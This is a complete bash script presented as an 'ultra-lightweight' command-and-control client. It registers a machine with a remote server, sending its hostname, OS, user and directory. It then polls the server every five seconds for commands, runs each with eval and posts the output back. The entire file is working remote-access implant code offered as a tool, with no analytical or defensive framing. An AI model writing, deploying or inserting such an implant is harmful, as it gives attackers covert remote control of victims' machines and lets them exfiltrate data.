#!/bin/bash
"""
Ultra-Lightweight Shell C2 Client
Pure bash implementation for minimal footprint
"""

# Configuration
C2_HOST="${1:-192.168.210.170}"
C2_PORT="${2:-8080}"
CLIENT_ID="$(hostname)-$$"
C2_URL="http://${C2_HOST}:${C2_PORT}"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

log() {
    echo -e "${BLUE}[$(date '+%H:%M:%S')]${NC} $1"
}

success() {
    echo -e "${GREEN}[+]${NC} $1"
}

error() {
    echo -e "${RED}[-]${NC} $1"
}

# Register client
register_client() {
    local data="{\"client_id\":\"${CLIENT_ID}\",\"hostname\":\"$(hostname)\",\"os\":\"$(uname -s)\",\"arch\":\"$(uname -m)\",\"user\":\"$(whoami)\",\"pwd\":\"$(pwd)\"}"
    
    curl -s -X POST \
        -H "Content-Type: application/json" \
        -d "$data" \
        "${C2_URL}/api/register" >/dev/null 2>&1
    
    if [ $? -eq 0 ]; then
        success "Registered with C2 server"
        return 0
    else
        error "Registration failed"
        return 1
    fi
}

# Execute command and send result
execute_command() {
    local cmd="$1"
    local cmd_id="$2"
    
    log "Executing: $cmd"
    
    # Execute command and capture output
    local output
    local exit_code
    output=$(eval "$cmd" 2>&1)
    exit_code=$?
    
    # Escape quotes in output for JSON
    output=$(echo "$output" | sed 's/"/\\"/g' | tr '\n' ' ')
    
    # Send result back to C2
    local result="{\"client_id\":\"${CLIENT_ID}\",\"command_id\":\"${cmd_id}\",\"result\":{\"success\":$([ $exit_code -eq 0 ] && echo true || echo false),\"stdout\":\"${output}\",\"exit_code\":${exit_code}}}"
    
    curl -s -X POST \
        -H "Content-Type: application/json" \
        -d "$result" \
        "${C2_URL}/api/results" >/dev/null 2>&1
}

# Check for commands
check_commands() {
    local response
    response=$(curl -s "${C2_URL}/api/clients/${CLIENT_ID}")
    
    if [ $? -eq 0 ] && [ -n "$response" ]; then
        # Simple JSON parsing for commands (requires jq for production)
        # For now, use grep/sed for basic parsing
        echo "$response" | grep -o '"command":"[^"]*"' | while IFS= read -r line; do
            local cmd=$(echo "$line" | sed 's/"command":"//g' | sed 's/"$//g')
            local cmd_id="cmd-$(date +%s)-$$"
            
            if [ -n "$cmd" ]; then
                execute_command "$cmd" "$cmd_id"
            fi
        done
    fi
}

# Main loop
main() {
    log "Shell Client $CLIENT_ID starting"
    log "C2 Server: $C2_URL"
    
    # Test connectivity
    if ! curl -s "${C2_URL}/health" >/dev/null 2>&1; then
        error "Cannot connect to C2 server at $C2_URL"
        exit 1
    fi
    
    success "Connected to C2 server"
    
    # Register client
    register_client
    
    # Main command loop
    while true; do
        check_commands
        sleep 5
    done
}

# Handle signals
trap 'log "Client stopping..."; exit 0' INT TERM

# Run main function
main "$@"